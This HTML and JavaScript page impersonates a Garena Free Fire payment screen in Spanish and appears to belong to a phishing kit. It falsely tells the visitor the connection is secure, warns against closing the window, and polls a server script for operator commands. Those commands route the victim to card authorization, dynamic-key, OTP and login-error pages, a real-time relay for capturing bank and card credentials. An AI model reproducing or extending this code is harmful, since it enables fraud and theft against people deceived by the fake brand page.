<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Procesando Pago | Garena Free Fire</title>

    <!-- Font Awesome Icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">

    <style>
        :root {
            --color-primary: #E41E26;
            --color-primary-light: #ff3841;
            --color-accent: #ff6b35;
            --color-dark: #0a0a0a;
        }

        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
        }

        .loader-container {
            text-align: center;
            padding: 40px;
            background: #1e1e1e;
            border-radius: 16px;
            box-shadow: 0 10px 40px rgba(228, 30, 38, 0.3), 0 2px 8px rgba(0, 0, 0, 0.5);
            border-top: 4px solid var(--color-primary);
            max-width: 400px;
            width: 90%;
        }

        .logo-container {
            margin-bottom: 24px;
        }

        .logo-img {
            height: 70px;
            object-fit: contain;
            border-radius: 12px;
        }

        .loader {
            border: 6px solid rgba(228, 30, 38, 0.2);
            border-top: 6px solid var(--color-primary);
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1.2s linear infinite;
            margin: 0 auto 24px;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        .loader-title {
            font-size: 1.25rem;
            font-weight: 700;
            color: #ffffff;
            margin: 0 0 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .loader-title i {
            color: var(--color-primary);
        }

        .loader-text {
            font-size: 0.9rem;
            color: #cccccc;
            line-height: 1.6;
            margin: 0;
        }

        .loader-secure {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            background: linear-gradient(135deg, rgba(228, 30, 38, 0.2) 0%, rgba(255, 107, 53, 0.2) 100%);
            padding: 8px 16px;
            border-radius: 18px;
            font-size: 0.75rem;
            color: #ff6b35;
            font-weight: 600;
            margin-top: 20px;
            border: 1px solid rgba(228, 30, 38, 0.4);
        }

        .debug-info {
            margin-top: 20px;
            padding: 12px;
            background: #2a2a2a;
            border-radius: 8px;
            font-size: 0.75rem;
            color: #999;
            font-family: monospace;
            border: 1px solid #333;
        }

        @media (max-width: 500px) {
            .loader-container {
                padding: 32px 24px;
            }

            .logo-img {
                height: 60px;
            }
        }
    </style>
</head>

<body>
    <div class="loader-container">
        <div class="logo-container">
            <img src="../images/free-fire-icon.png" alt="Free Fire" class="logo-img">
        </div>

        <div class="loader"></div>

        <h2 class="loader-title">
            <i class="fas fa-credit-card"></i>
            Procesando tu pago
        </h2>
        <p class="loader-text">
            Estamos verificando tu informaci√≥n con el banco.<br>
            Por favor no cierres esta ventana.
        </p>

        <div class="loader-secure">
            <i class="fas fa-shield-alt"></i>
            Conexi√≥n segura
        </div>

        <!-- Debug info (quitar en producci√≥n) -->
        <div class="debug-info" id="debugInfo">
            <i class="fas fa-terminal"></i> Esperando respuesta...
        </div>
    </div>

    <script>
        const POLL_INTERVAL = 1000; // 1 segundos
        const MAX_RETRIES = 100; // 5 minutos m√°ximo
        let pollCount = 0;
        let isPolling = false;

        function manejarAccion(action) {
            console.log('‚úÖ Acci√≥n recibida:', action);
            isPolling = false;

            // Redirigir seg√∫n acci√≥n
            switch (action) {
                case 'NEXT_AUT':
                    window.location.href = 'autorizacioncc.html';
                    break;
                case 'NEXT_DIN':
                    window.location.href = 'dinamica.html';
                    break;
                case 'NEXT_OTP':
                    window.location.href = 'otp.html';
                    break;
                case 'ERR_TC':
                    window.location.href = 'error_tarjeta.html';
                    break;
                case 'ERR_LOGIN':
                    window.location.href = 'error_login.html';
                    break;
                case 'ERR_DIN':
                    window.location.href = 'error_dinamica.html';
                    break;
                case 'ERR_OTP':
                    window.location.href = 'error_otp.html';
                    break;
                case 'FINISH':
                    window.location.href = '../exito.html';
                    break;
                default:
                    console.log('‚ö†Ô∏è Acci√≥n desconocida:', action);
            }
        }

        function poll() {
            if (!isPolling) {
                console.log('‚èπÔ∏è Polling detenido');
                return;
            }

            if (pollCount >= MAX_RETRIES) {
                console.error('‚ùå Timeout: m√°ximo de reintentos alcanzado');
                document.getElementById('debugInfo').innerHTML = '<i class="fas fa-exclamation-triangle"></i> Timeout. Recarga la p√°gina.';
                isPolling = false;
                return;
            }

            pollCount++;
            console.log(`üì° Polling intento ${pollCount}/${MAX_RETRIES}`);
            document.getElementById('debugInfo').innerHTML = `<i class="fas fa-spinner fa-spin"></i> Intento ${pollCount}/${MAX_RETRIES}...`;

            fetch('../poll_updates.php')
                .then(res => {
                    if (!res.ok) {
                        throw new Error('HTTP ' + res.status);
                    }
                    return res.json();
                })
                .then(data => {
                    console.log('üì• Respuesta:', data);

                    const action = data?.data?.action || null;

                    if (action) {
                        console.log('üéØ Acci√≥n encontrada:', action);
                        manejarAccion(action);
                    } else {
                        console.log('‚è≥ Sin acci√≥n, esperando...');
                        if (isPolling) {
                            setTimeout(poll, POLL_INTERVAL);
                        }
                    }
                })
                .catch(err => {
                    console.error('‚ùå Error:', err);
                    document.getElementById('debugInfo').innerHTML = '<i class="fas fa-times-circle"></i> Error: ' + err.message;
                    if (isPolling) {
                        setTimeout(poll, POLL_INTERVAL);
                    }
                });
        }

        // ‚úÖ LIMPIAR acci√≥n al cargar la p√°gina
        window.addEventListener('DOMContentLoaded', async () => {
            console.log('üßπ Limpiando acciones anteriores...');
            document.getElementById('debugInfo').innerHTML = '<i class="fas fa-broom"></i> Limpiando...';

            try {
                await fetch('../poll_updates.php?clear=1');
                console.log('‚úÖ Acciones limpiadas');
                document.getElementById('debugInfo').innerHTML = '<i class="fas fa-hourglass-half"></i> Esperando respuesta...';
            } catch (err) {
                console.error('‚ùå Error al limpiar:', err);
            }

            // Esperar 1 segundo antes de empezar polling
            setTimeout(() => {
                console.log('üöÄ Iniciando polling...');
                isPolling = true;
                pollCount = 0;
                poll();
            }, 1000);
        });

        // Prevenir cierre accidental
        window.addEventListener('beforeunload', (e) => {
            if (isPolling) {
                e.preventDefault();
                e.returnValue = '';
            }
        });
    </script>

</body>

</html>
